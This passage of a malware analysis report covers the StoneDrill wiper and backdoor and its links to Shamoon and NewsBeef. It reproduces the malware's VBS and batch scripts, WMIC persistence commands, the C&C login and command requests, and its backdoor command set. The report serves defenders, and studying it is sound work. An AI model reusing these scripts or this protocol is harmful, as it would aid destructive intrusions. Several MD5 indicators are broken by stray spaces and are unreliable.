1999.02.08 06:15:47 (GMT), VC 2015\n\nType I386 GUI EXE\n\nSize 195072 bytes\n\nThe malware PE file timestamp is fake; however, the authors forgot to alter a timestamp inside\nthe debug directory. The real timestamp from the debug directory points to: 2016.11.14\n21:16:45\n\n|SHA256|62aabce7a5741a9270cddac49cd1d715305c1d0505e620bbeaec6ff9b6fd0260|\n|---|---|\n|MD5|0ccc9ec82f1d44c243329014b82d3125|\n|Compiled|1999.02.08 06:15:47 (GMT), VC 2015|\n|Type|I386 GUI EXE|\n|Size|195072 bytes|\n\n\n-----\n\n1. The module highlighted above starts from a heavy anti-emulation function that contains\n\nnumerous WinAPI calls with invalid parameters. The goal is to break through the\ndetection of antivirus emulators and heuristic detection.\n2. The second anti-emulation technique is run before the payload execution: this module\n\ncreates a hidden dialog window, then finds and programmatically clicks the “OK” button\non that dialog. After that, another series of incorrect WinAPI calls follow.\n3. The malware then finds the file path of the default Internet browser app by looking into\n\nthe following registry keys:\n\na. **SOFTWARE\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\Us**\n\n**erChoice**\nb. **HKCR\\%ProgId_val%\\shell\\open\\command**\n4. The malware then checks to ensure the browser is not LaunchWinApp.exe or is\n\ncompiled for the 64-bit architecture, in which case the path of\n“%PROGRAM_FILESX86%\\Internet Explorer\\iexplore.exe” is used instead.\n5. The default browser is then started and the wiper module is injected into the running\n\nbrowser memory.\n6. After the successful start of the wiper module, the following script is dropped and\n\nexecuted: “%temp%\\C-Dlt-C-Org-T.vbs”\n7. Another temporary file is dropped “%temp%\\C-Dlt-C-Trsh-T.tmp” which contains the\n\nname of the Injector module; this file is deleted after execution is completed.\n\n**WScript.Sleep(10 * 1000)**\n**On Error Resume Next**\n**Set WshShell = CreateObject(\"Scripting.FileSystemObject\")**\n**While WshShell.FileExists(\"%selfname%\")**\n**WshShell.DeleteFile \"%selfname%\"**\n**Wend**\n**WScript.Sleep(10 * 1000)**\n**WshShell.DeleteFile \"%temp%\\C-Dlt-C-Org-T.vbs\"**\n**Set WshShell = Nothing**\n\n_%temp%\\C-Dlt-C-Org-T.vbs File contents_\n\n##### 2.4.1. The StoneDrill Disk Wiper Module\n\nSHA256 bf79622491dc5d572b4cfb7feced055120138df94ffd2b48ca629bb0a77514cc\n\nMD5 697c515a46484be4f9597cb4f39b2959\n\nCompiled 2016.11.14 21:16:40 (GMT), VC 2015\n\nType I386 GUI EXE\n\nSize 130 560 bytes\n\nUnlike Shamoon, the StoneDrill disk wiper module is not written onto disk but instead is injected\ndirectly into the user’s preferred browser process memory. This module inherits the second anti\n|SHA256|bf79622491dc5d572b4cfb7feced055120138df94ffd2b48ca629bb0a77514cc|\n|---|---|\n|MD5|697c515a46484be4f9597cb4f39b2959|\n|Compiled|2016.11.14 21:16:40 (GMT), VC 2015|\n|Type|I386 GUI EXE|\n|Size|130 560 bytes|\n\n\n-----\n\nemulation trick only (clicking the button on the hidden dialog window); it is also obfuscated with\nthe same alphabet-based string encryption. If the browser process privileges do not permit the\nraw disk wiping, only the user-accessible files are deleted.\n\nDepending on the configuration, this module wipes with random data one of following possible\ntargets:\n\n  - All accessible physical drives by using the device path “\\\\.\\PhysicalDrive”\n\n  - All accessible logical drives by using device path “\\\\.\\X:”\n\n  - Recursively wipes and deletes files in all folders except “Windows” on all accessible\n\nlogical drives\n\n  - Places a special emphasis on wiping files named “asdhgasdasdwqe%digits%” in the\n\nroot folder of the disk.\nJust like Shamoon, after the wipe process is completed, the system is rebooted.\n\n#### 2.5. The StoneDrill backdoor\n\nAccording to the PE timestamps from StoneDrill sample two and sample one (2016.10.19 and\n2016.11.14 respectively), this malware file was compiled a month before the previously\ndescribed StoneDrill sample. However, internally this tool wrapper (injector) looks like a more\nmodern evolution of the previously discussed wiper wrapper.\n\nThe sample is generally of low quality, with many unused code blocks, unreliable anti-emulation\nand few non critical bugs. In some cases functions are executed but the results are not used:\n\n  - Is the current user a domain administrator?\n\n  - Is the antivirus process currently running?\n\n  - Is the current process running in a virtual environment such as VMware or VirtualBox?\n\n#### 2.6. The StoneDrill Installer/Injector module\n\nSHA256 69530d78c86031ce32583c6800f5ffc629acacb18aac4c8bb5b0e915fc4cc4db\n\nMD5 ac3c25534c076623192b9381f926ba0d\n\nCompiled 2016.10.19 14:26:01 (GMT), VC 2015\n\nType I386 GUI EXE\n\nSize 227840 bytes\n\n##### 2.6.1. First step: anti-emulation tricks\n\nThis module is very similar to the above discussed injector module, utilizing the same set of\nanti-emulation tricks, injection into the user’s preferred browser and VBS scripts. A distinction in\n\n|SHA256|69530d78c86031ce32583c6800f5ffc629acacb18aac4c8bb5b0e915fc4cc4db|\n|---|---|\n|MD5|ac3c25534c076623192b9381f926ba0d|\n|Compiled|2016.10.19 14:26:01 (GMT), VC 2015|\n|Type|I386 GUI EXE|\n|Size|227840 bytes|\n\n\n-----\n\nthis sample is the wide utilization of the WMI command-line (WMIC) utility to run tasks such as\nrunning the dropped VBS script or making registry modifications.\n\nStrings in this module are encrypted in two ways:\n\n  - Alphabet replacement\n\n  - SSE XOR 0x5235\n\n##### 2.6.2. Second step: name construction and installation\n\nThis module checks if it is already running from the “%COMMON_APPDATA%\\Chrome” folder.\nIn cases where the malware is started from a different folder, the installation procedure is\nstarted.\n\nDuring installation, a name is constructed through concatenation of three randomly selected\nstrings from the below three sets – for example PowerNetworkProxy, RAMFirewallTransfer,\nLocationAgentFramework):\n\nIntel, AMD, Microsoft, Windows, Java, Adobe, Cisco, SunGard, Query, Location, Power, NFC, DotNet,\n**Set1**\nMFC, WMI, SQL, Office, Bitlocker, Map, Fingerprint, Packet, Registery, RAM, CPU, ROM, Memory,\nMonitor, CDROM, Run-time, Task, Ethernet, Application, Lockscreen, Cloud, Browser, Cash, Desktop,\nDisplay\n\nFile, System, Service, Device, Software, Hardware, VM, Network, Performance, Graphic, Engine, Agent,\n**Set2**\nData, Wizard, Server, Media, History, Storage, Core, boot, Gaming, Firewall\n\nManager, Arranger, Controller, Host, Help, Diagnostics, LogOn, Plug, Proxy, Events, Transfer, Policy,\n**Set3**\nRecovery, Details, Provider, Adapter, CleanUp, Encryption, Extention, APP, Client, Menu, Stub,\nExecute, Luncher, Framework, Tester, Model, Backup, API\n\nThe VBS script “%TEMP%\\C-PDC-C-Cpy-T.vbs” is then dropped in %TEMP%\\\n\n**On Error Resume Next**\n**Set WshShell = CreateObject(\"Scripting.FileSystemObject\")**\n**WshShell.CopyFile \"%SELF_NAME%\", \"%COMMON_APPDATA%\\Chrome\\%SELECTED_NAME%.exe\"**\n**Set WshShell = Nothing**\n\n**C-PDC-C-Cpy-T.vbs body template**\n\nThe script is executed using the following command to do self-copy into the\n“%COMMON_APPDATA%\\Chrome” folder:\n\n**cmd /c WMIC Process Call Create \"C:\\Windows\\System32\\Wscript.exe //NOLOGO %TEMP%\\C-PDC-C-Cpy-**\n**T.vbs\"**\n\nAnother VBS script named “C-PDI-C-Cpy-T.vbs” is dropped into %TEMP% folder and executed\nin the same method (via WMIC used to make a second malware copy with pathname)\n“C:\\ProgramData\\InternetExplorer\\%SELECTED_NAME%Stp.exe”\n\n|Set1|Intel, AMD, Microsoft, Windows, Java, Adobe, Cisco, SunGard, Query, Location, Power, NFC, DotNet, MFC, WMI, SQL, Office, Bitlocker, Map, Fingerprint, Packet, Registery, RAM, CPU, ROM, Memory, Monitor, CDROM, Run-time, Task, Ethernet, Application, Lockscreen, Cloud, Browser, Cash, Desktop, Display|\n|---|---|\n|Set2|File, System, Service, Device, Software, Hardware, VM, Network, Performance, Graphic, Engine, Agent, Data, Wizard, Server, Media, History, Storage, Core, boot, Gaming, Firewall|\n|Set3|Manager, Arranger, Controller, Host, Help, Diagnostics, LogOn, Plug, Proxy, Events, Transfer, Policy, Recovery, Details, Provider, Adapter, CleanUp, Encryption, Extention, APP, Client, Menu, Stub, Execute, Luncher, Framework, Tester, Model, Backup, API|\n\n\n-----\n\n**On Error Resume Next**\n**Set WshShell = CreateObject(\"Scripting.FileSystemObject\")**\n**WshShell.CopyFile \"%COMMON_APPDATA%\\Chrome\\%SELECTED_NAME%.exe\",**\n**\"C:\\ProgramData\\InternetExplorer\\%SELECTED_NAME%Stp.exe\"**\n\n**C-PDI-C-Cpy-T.vbs body template**\n\nPathnames of these two VBS files as well as the initial malware pathname are written into\n%TEMP%\\C-Dlt-C-Trsh-T.tmp file.\n\nAt the end of the installation procedure the copy of malware (found in\n“%COMMON_APPDATA%\\Chrome\\%SELECTED_NAME%.exe”) is executed (via “cmd /c\n**wmic process call create”) and the initial process terminates itself.**\n\n##### 2.6.3. Third step\n\nWhen the malware is started from within the “%COMMON_APPDATA%\\Chrome” folder, the\n“FileInfo.txt” file is created in the same folder and contains the pathname of the first copy of\nmalware (“%COMMON_APPDATA%\\Chrome\\%SELECTED_NAME%.exe”)\n\nThen the third copy of the malware is created by the command “%COMSPEC% /c copy\n**\"%SELFNAME\" %TEMP%\\bd891.tmp”, which checks the target file to verify if command**\nexecution is successful, then deletes the bd891.tmp file. The last mentioned is used as another\nanti-emulation trick in the StoneDrill arsenal.\n\n##### 2.6.4. Fourth step: Payload injection\n\nThe payload is extracted from the resources section, decrypted and unpacked similarly to the\npreviously described wiper injector module. The difference here is that for the decryption of the\npayload module, SSE instructions are used.\n\nIn the same style, the payload is injected into the user preferred browser process, with an\nadditional step after the payload module injection: the resource segment responsible for the\npayload configuration is replaced in memory with the resource taken from the parent module.\n\nAfter the payload start is attempted, the VBS files listed inside C-Dlt-C-Trsh-T.tmp and C-Dlt**C-Trsh-T.tmp are deleted.**\n\n##### 2.6.5. Fifth step: If not started\n\nIf the payload is not started, then %TEMP%\\C-Dlt-C-Org-T.vbs is dropped and executed to\ndelete initial malware copy.\n\n**WScript.Sleep(10 * 1000)**\n**On Error Resume Next**\n**Set WshShell = CreateObject(\"Scripting.FileSystemObject\")**\n**While WshShell.FileExists(\"%initial_malware_pathname%\")**\n**WshShell.DeleteFile \"%initial_malware_pathname%\"**\n**Wend**\n\n\n-----\n\n**WScript.Sleep(10 * 1000)**\n**WshShell.DeleteFile \"%TEMP%\\C-Dlt-C-Org-T.vbs\"**\n**Set WshShell = Nothing**\n\n#### 2.7. StoneDrill remote access payload module\n\nSHA256 105ee777ad31a58301310719b49c7b6a7e957823e4dabbfeaa6a14e313008c1b\n\nMD5 e3a82d1db3ae8b189d2e1e0a22d6c82f\n\nCompiled 2016.10.19 16:49:36 (GMT), VC 2015\n\nType I386 GUI EXE\n\nSize 317 440 bytes\n\nVersion 2.0.1610.76\n\nThis module is not dropped into disk but injected directly into the user preferred browser\nprocess memory. The module is written in C++ with the use of STL classes, with numerous\nforgotten debug strings.\n\n##### 2.7.1. First step: Decryption\n\nStrings in this module are encrypted by ROR, NEG, ADD or simply XOR. An unreliable antiemulation technique is utilized which makes the whole module unstable. The author assumed\nthat the execution of the Sleep function with parameter 4020 milliseconds would increase the\nsystem value of KUSER_SHARED_DATA::InterruptTime to four seconds (rounded to the\nnearest second). If the InterruptTime is increased only by two seconds this module just exits\nimmediately. In case of other values, the module will crash due to the incorrect decryption of\nstrings.\n\nThe configuration block is then loaded from resources and decrypted by two passes of XOR.\n\nThe original module configuration resource is empty - the injector module just patches this\nresource, replacing the configuration with its own. In the configuration block, “ux” and “uy” are\nthe C&C servers, “Cid” is part of the connection query and seems to be a client ID.\n\n|SHA256|105ee777ad31a58301310719b49c7b6a7e957823e4dabbfeaa6a14e313008c1b|\n|---|---|\n|MD5|e3a82d1db3ae8b189d2e1e0a22d6c82f|\n|Compiled|2016.10.19 16:49:36 (GMT), VC 2015|\n|Type|I386 GUI EXE|\n|Size|317 440 bytes|\n|Version|2.0.1610.76|\n\n\n-----\n\n##### 2.7.2. Second step: Registering autorun of installer (injector) module\n\nThe malware reads and de-XORs content of the\n**C:\\ProgramData\\InternetExplorer\\FileInfoStp.txt file, then deletes and unregisters the**\nautorun file defined in FileInfoStp.txt (autorun key deleted from registry) with the command:\n\n**cmd /c REG DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Stp /f”**\n\nNext, the file C:\\ProgramData\\InternetExplorer\\FileInfoStp.txt is deleted and replaced by the\ncommand:\n\n**cmd /c Copy /Y \"C:\\ProgramData\\Chrome\\FileInfo.txt\" \"C:\\ProgramData\\InternetExplorer\\FileInfoStp.txt\"**\n\nThe malware then drops and executes file %TEMP%\\C-Strt-C-Up-T.bat\n\n**ping 1.0.0.0 -n 1 -w 20000 > nul**\n**@ECHO OFF**\n**wmic /NameSpace:\\\\root\\default Class StdRegProv Call SetStringValue hDefKey = \"&H80000001\"**\n**sSubKeyName = \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\" sValue =**\n**\"C:\\ProgramData\\InternetExplorer\\%SELECTED_NAME%Stp.exe\" sValueName = \"Stp\"**\n**Del \"%TEMP%\\C-Strt-C-Up-T.bat\"**\n\n##### 2.7.3. Third step: C&C server selection\n\nMultiple attempts are made to connect to the hosts configured in the ux and uy fields (found in\nthe sample configuration). The malware issues GET requests to\n“ct_if/ctpublic/Check_Exist.php”. The server answering with the “HANW-J6YS-P81J-KSD7”\nstring is selected as the current live server.\n\n**C&C login**\n\nThe next connection is a login attempt with the following request:\n\n**POST / HTTP/1.1**\n**Host: www.eservic.com**\n**User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:23.0) Gecko/20100101 Firefox/23.0**\n**Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8**\n**Accept-Language: en-US,en;q=0.5**\n**Referer: http://www.eservic.com/**\n**Connection: close**\n**Content-Type: application/x-www-form-urlencoded**\n**Content-Length: 96**\nusername=MD5Sum(login)&password=MD5Sum(password)&button=Login\n\n\n-----\n\n##### 2.7.4. Fourth step: Get commands list\n\nDuring the fourth step, the malware requests available commands from the C&C:\n\n**GET**\n**/insert/index?id=%cid_from_config%%random_part_of_client_id%&hst=%base64encoded_computer_and_user_**\nname_cpuid0_checksum%&ttype=102&sta\n**te=201** **HTTP/1.1**\n**Host: www.eservic.com**\n**Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8**\n**Accept-Language: en-US,en;q=0.5**\n**Cookie: %string_received_in_login_step%**\n**Connection: close**\n\n**Here is a list of the StoneDrill commands available:**\n\n|Command|Internal Help Strings|Command Description|\n|---|---|---|\n|os|1. OS (The is Response the Operating System of the Client Machine)|Return details about Windows version, edition, architecture and environment|\n|version|2. Version (The Response is Version of Running Product on the Client Machine)|“2.0.1610.76” string returned|\n|time|3. Time (The Response is Current Time of the Client Machine)|Current system and local time are returned|\n|shell|4. Shell Value (Give You Access the CMD Console in the Client Machine; Value is Anything that You Want to Writing in the CMD Console of the Client Machine and Execute it)|Stdout/stderr streams of executed “cmd.exe /C %value%” command are captured and send back to CC|\n|screenshot|5. Screenshot (The Response is a JPEG File of the Screenshot of the Client Machine Desktop)|1-At first the malware takes screenshot into randomly named .bmp file in %TEMP% folder. 2-Then takes second screenshot, now with jpeg compression and store it as .jpg file with random name. In case of success jpg creation bmp file is deleted. 3-Send screenshot file to C&C and delete temporary files.|\n|delay|6. Delay Value (Adjust the Time-Interval for the Server and Client Communication; Value can be Between 1000-100000; 1000 is High- End Speed)||\n|download|7. Download \"From\" \"To\" (Download a File From \"a URL\" To \"a Directory on the Client Machine\")|Downloaded file initially stored as “%TEMP%\\Test.tmp”, then deXORed with 0xCC and copied to specified location with VBS script “C- Dled-C-Cpy-T.vbs” as previously described, file is then executed with command: \"cmd /c WMIC Process Call Create|\n\n\n-----\n\n|Col1|Col2|C:\\Windows\\System32\\Wscri pt.exe //NOLOGO|Col4|\n|---|---|---|---|\n|upload|8. Upload \"From\" (Upload a File From \"a Directory on the Client Machine\")|||\n|update|9. Update \"From\" (Download the New Version of the Product From \"a URL\" and Execute it on the Client Machine)|Downloaded file initially stored with random name inside %TEMP% folder, then renamed by using C- Uptd-C-Cpy-T.vbs and C-Up-C-Dt-T.bat similar to previous steps||\n|uninstall|10. Uninstall (Uninstall The Running Product from the Client Machine and Delete All Side- Effects)|Unregister autorun with command: cmd /c REG DELETE HKCU\\SOFTWARE\\Microsoft\\ Windows\\CurrentVersion\\Run /v Stp /f Then drop and run C-Un-C-Instl-T.bat with body:||\n|||ping 1.1.1.1 -n 5 -w 2000 > nul RMDIR /S /Q \"C:\\ProgramData\\Chrome\\\" RMDIR /S /Q \"C:\\ProgramData\\InternetExplorer\\\" Del \"%TEMP%\\C-Un-C-Instl-T.bat\"||\n|||Then terminates itself.||\n|antivirus|11. Antivirus (The Response is Installed Antivirus on the Client Machine)|Queries Windows Management Instrumentation (WMI) database for installed AntiVirusProduct details. Runs additional registry lookups for details of: Avast, McAfee, Avg, BitDefender products.||\n|help|12. Help (Response is the List of Supported Commands in the Current Version of Product that Running on the Client Machine)|List title is \"-Command List of the Current Vesrion are:\"||\n\n\n#### 2.8. StoneDrill similarities with Shamoon \n\nOf course, one of the most important questions is the following: are StoneDrill and Shamoon\nconnected? This is a difficult question to answer. However, by listing the similarities and\ndifferences between the two, anyone can come up with their own answer.\n\nAlthough we used a Yara built on Shamoon samples to find StoneDrill, there are several other\nsimilarities between the two:\n\n  - Both Shamoon and StoneDril appear to be targeting Saudi organizations.\n\n  - Samples have been compiled around the same time - October-November 2016.\n\n  - Similar to previous generations of Shamoon, StoneDrill uses encrypted PE resources to\n\nstore the actual payload.\n\n\n-----\n\nThe most important differences include:\n\n  - To avoid detection by emulators and sandboxing tools, the StoneDrill authors used far\n\nmore advanced anti-emulation techniques than Shamoon.\n\n  - StoneDrill utilises VBS scripts to run self-delete scripts, while Shamoon didn’t use any\n\nexternal scripts.\n\n  - A distinction from the Shamoon malware is that the strings encryption in StoneDrill is\n\nperformed by alphabet table replacement.\n\n  - StoneDrill does not use drivers during deployment, but rather through memory injection\n\ninto the victim’s preferred browser.\n\n#### 2.9. StoneDrill similarities with NewsBeef\n\nOur initial analysis of StoneDril revealed some similarities with a threat actor we’ve seen before NewsBeef. While we call this the NewsBeef APT, this group has been reported in the past as\nCharming Kitten or Newscaster (in 2014).\n\nThe similarities between NewsBeef and StoneDrill make us believe there is a very strong\nconnection there. Below we list some of the similarities we observed:\n\n##### 2.9.1. Winmain Signature\n\n**In NewsBeef:**\n\nB8 08 00 FE 7F FF 30 8F 44 24 20 68 B4 0F 00 00 FF 15 78 70 44 00 B8 08 00 FE 7F FF 30 8F 44 24 24 8B 4C\n24 24 2B 4C 24 20 B8 6B CA 5F 6B F7 E1 C1 EA 16 80 EA 02 88 15 95 71 45 00\n\n**In StoneDrill:**\n\nB8 08 00 FE 7F FF 30 8F 44 24 14 68 B4 0F 00 00 FF 15 4C B0 63 00 B8 08 00 FE 7F FF 30 8F 44 24 10 8B 44\n24 10 33 D2 2B 44 24 14 B9 80 96 98 00 F7 F1 2C 02 A2 61 D6 64 00\n\n\n-----\n\n##### 2.9.2. The OS command\n\n**In NewsBeef:**\n\n**In StoneDrill:**\n\n\n-----\n\n##### 2.9.3. The Update command\n\n**In NewsBeef:**\n\n**In StoneDrill:**\n\n##### 2.9.4. The Strings Decryption routine\n\n**In NewsBeef:**\n\n**In StoneDrill:**\n\n\n-----\n\n##### 2.9.5. The Payload Winmain\n\n**In NewsBeef:**\n\n**In StoneDrill:**\n\n##### 2.9.6. Command center name similarities\n\nBesides the technical code similarities listed above, we noticed that the naming scheme for the\nNewsBeef and StoneDrill C&Cs is quite similar. For instance:\n\n|StoneDrill|NewsBeef|\n|---|---|\n|www.chromup[.]com|www.chrome-up[.]date service1.chrome-up[.]date service.chrome-up[.]date|\n|www.eservic[.]com|webmaster.serveirc[.]com|\n\n\n-----\n\n## 3. Conclusions\n\nOur discovery of StoneDrill gives another dimension to the existing wave of wiper attacks\nagainst Saudi organizations that started with Shamoon 2.0 in November 2016. Compared to the\nnew Shamoon 2.0 variants, the most significant difference is the lack of a disk driver used for\ndirect access during the destructive step. Nevertheless, one does not necessarily need raw disk\naccess to perform destructive functions at file level, which the malware implements quite\nsuccessfully.\n\nOf course, one of the most important questions here is the connection between Shamoon and\nStoneDrill. Both wipers appear to have been used against Saudi organizations during a similar\ntimeframe of October-November 2016. Several theories are possible here:\n\n  - StoneDrill is a less-used wiper tool, deployed in certain situations by the same Shamoon\n\ngroup.\n\n  - StoneDrill and Shamoon are used by different groups which are aligned in their interests.\n\n  - StoneDrill and Shamoon are used by two different groups which have no connection to\n\neach other and just happen to target Saudi organizations at the same time.\n\nTaking all factors into account, our opinion is that the most likely theory is the second.\n\nAdditionally, StoneDrill appears to be connected with previously reported NewsBeef activity,\nwhich continues to target Saudi organizations. From this point of view, NewsBeef and StoneDrill\nappear to be continuously focused on targeting Saudi interests, while Shamoon is a flashy,\ncome-and-go high impact tool.\n\nIn terms of attribution, while Shamoon embeds Arabic-Yemen resource language sections,\nStoneDrill embeds mostly Persian resource language sections. Geopolitical analysts would be\n[quick to point out that Iran and Yemen are both players in the Iran-Saudi Arabia proxy conflict.](https://en.wikipedia.org/wiki/Iran%E2%80%93Saudi_Arabia_proxy_conflict)\nOf course, we do not exclude the possibility of false flags.\n\nFinally, many unanswered question remain in regards to StoneDrill and NewsBeef. The\ndiscovery of the StoneDrill wiper in Europe is a significant sign that the group is expanding its\ndestructive attacks outside the Middle East. The target for the attack appears to be a large\ncorporation with a wide area of activity in the petro-chemical sector, with no apparent\nconnection or interest in Saudi Arabia.\n\nAs usual, we will continue to monitor the Shamoon, StoneDrill and NewsBeef attacks. A\npresentation about StoneDrill will be given at the Kaspersky Security Analyst Summit\nConference, on April 2-6, 2017.\n\n**Kaspersky Lab products detect the Shamoon and StoneDrill samples as:**\n\nTrojan.Win32.EraseMBR.a\n\nTrojan.Win32.Shamoon.a\n\n\n-----\n\nTrojan.Win64.Shamoon.a\n\nTrojan.Win64.Shamoon.b\n\nBackdoor.Win32.RemoteConnection.d\n\nTrojan.Win32.Inject.wmyv\n\nTrojan.Win32.Inject.wmyt\n\nHEUR:Trojan.Win32.Generic\n\n\n-----\n\n## 4. Appendices\n\n#### 4.1. Indicators of Compromise\n\n##### 4.1.1. Shamoon MD5s\n\n00c417425a73db5a315d23f ac8cb353f\n\n271554cff 73c3843b9282951f 2ea7509\n\n2cd0a5f 1e9bcce6807e57ec8477d222a\n\n33a63f 09e0962313285c0f 0f b654ae11\n\n38f 3bed2635857dc385c5d569bbc88ac\n\n41f 8cd9ac3f b6b1771177e5770537518\n\n5446f 46d89124462ae7aca4f ce420423\n\n548f 6b23799f 9265c01f eef c6d86a5d3\n\n63443027d7b30ef 0582778f 1c11f 36f 3\n\n6a7bff 614a1c2f d2901a5bd1d878be59\n\n6bebb161bc45080200a204f 0a1d6f c08\n\n7772ce23c23f 28596145656855f d02f c\n\n7946788b175e299415ad9059da03b1b2\n\n7edd88dd4511a7d5bcb91f 2ff 177d29d\n\n7f 399a3362c4a33b5a58e94b8631a3d5\n\n8405aa3d86a22301ae62057d818b6b68\n\n8712cea8b5e3ce0073330f d425d34416\n\n8f be990c2d493f 58a2af a2b746e49c86\n\n940cee0d5985960b4ed265a859a7c169\n\n9d40d04d64f 26a30da893b7a30da04eb\n\naae531a922d9cca9ddca3d98be09f 9df\n\n**ac8636b6ad8f 946e1d756cd4b1ed866d**\n\naf 053352f e1a02ba8010ec7524670ed9\n\nb4ddab362a20578dc6ca0bc8cc8ab986\n\nbaa9862b027abd61b3e19941e40b1b2d\n\nc843046e54b755ec63ccb09d0a689674\n\nd30cf a003ebf cd4d7c659a73a8dce11e\n\n\n-----\n\nda3d900f 8b090c705e8256e1193a18ec\n\ndc79867623b7929f d055d94456be8ba0\n\nec010868e3e4c47239bf 720738e058e3\n\nef ab909e4d089b8f 5a73e0b363f 471c1\n\n##### 4.1.2. StoneDrill MD5s\n\nac3c25534c076623192b9381f 926ba0d\n\n0ccc9ec82f 1d44c243329014b82d3125\n\n8e67f 4c98754a2373a49eaf 53425d79a\n\nf b21f 3cea1aa051ba2a45e75d46b98b8\n\n##### 4.1.3. StoneDrill C2s\n\nwww.eservic[.]com\n\nwww.securityupdated[.]com\n\nwww.actdire[.]com\n\nwww.chromup[.]com\n\n##### 4.1.4. NewsBeef C2s\n\nwww.chrome-up[.]date\n\nservice1.chrome-up[.]date\n\nservice.chrome-up[.]date\n\nwebmaster.serveirc[.]com\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        },
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        },
        {
            "id": "6825b8cb-7d82-43d2-b0b0-d51c7e255b42",
            "created_at": "2023-01-06T13:46:37.642134Z",
            "updated_at": "2023-01-06T13:46:37.642134Z",
            "deleted_at": null,
            "name": "MISPGALAXY",
            "url": "https://www.misp-project.org/galaxy.html",
            "description": "MISP Galaxy Clusters",
            "reports": null
        }
    ],
    "references": [
        "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf",
        "https://securelist.com/files/2017/03/Report_Shamoon_StoneDrill_final.pdf"
    ],
    "report_names": [
        "Report_Shamoon_StoneDrill_final.pdf"
    ],
    "threat_actors": [
        {
            "id": "82b92285-4588-48c9-8578-bb39f903cf62",
            "created_at": "2022-10-25T15:50:23.850506Z",
            "updated_at": "2025-03-27T02:00:55.501372Z",
            "deleted_at": null,
            "main_name": "Charming Kitten",
            "aliases": [
                "Charming Kitten"
            ],
            "source_name": "MITRE:Charming Kitten",
            "tools": [
                "DownPaper"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "42a6a29d-6b98-4fd6-a742-a45a0306c7b0",
            "created_at": "2022-10-25T15:50:23.710403Z",
            "updated_at": "2025-03-27T02:00:55.531313Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "Whisper Spider"
            ],
            "source_name": "MITRE:Silence",
            "tools": [
                "Winexe",
                "SDelete"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e58deb93-aff1-4be5-8deb-37fe8af0b7ed",
            "created_at": "2022-10-25T16:07:23.918534Z",
            "updated_at": "2025-03-27T02:02:10.02879Z",
            "deleted_at": null,
            "main_name": "Greenbug",
            "aliases": [
                "Greenbug",
                "Volatile Kitten"
            ],
            "source_name": "ETDA:Greenbug",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e034b94b-9655-42c4-a72e-a58807dce299",
            "created_at": "2022-10-25T16:07:24.133537Z",
            "updated_at": "2025-03-27T02:02:10.118581Z",
            "deleted_at": null,
            "main_name": "Rocket Kitten",
            "aliases": [
                "Group 83",
                "NewsBeef",
                "Newscaster",
                "Operation Newscaster",
                "Operation Woolen-GoldFish",
                "Parastoo",
                "Rocket Kitten"
            ],
            "source_name": "ETDA:Rocket Kitten",
            "tools": [
                "CoreImpact (Modified)",
                "FireMalv",
                "Ghole",
                "Gholee"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "88e53203-891a-46f8-9ced-81d874a271c4",
            "created_at": "2022-10-25T16:07:24.191982Z",
            "updated_at": "2025-03-27T02:02:10.13692Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "ATK 86",
                "Contract Crew",
                "TAG-CR8",
                "TEMP.TruthTeller",
                "Whisper Spider"
            ],
            "source_name": "ETDA:Silence",
            "tools": [
                "EDA",
                "EmpireDNSAgent",
                "Farse",
                "Ivoke",
                "Kikothac",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Meterpreter",
                "ProxyBot",
                "ReconModule",
                "Silence.Downloader",
                "TiniMet",
                "TinyMet",
                "TrueBot",
                "xfs-disp.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "6bba8e81-73af-4010-86dc-d43c408ca342",
            "created_at": "2023-01-06T13:46:38.553459Z",
            "updated_at": "2025-03-27T02:00:02.860364Z",
            "deleted_at": null,
            "main_name": "Greenbug",
            "aliases": [],
            "source_name": "MISPGALAXY:Greenbug",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "029625d2-9734-44f9-9e10-b894b4f57f08",
            "created_at": "2023-01-06T13:46:38.364105Z",
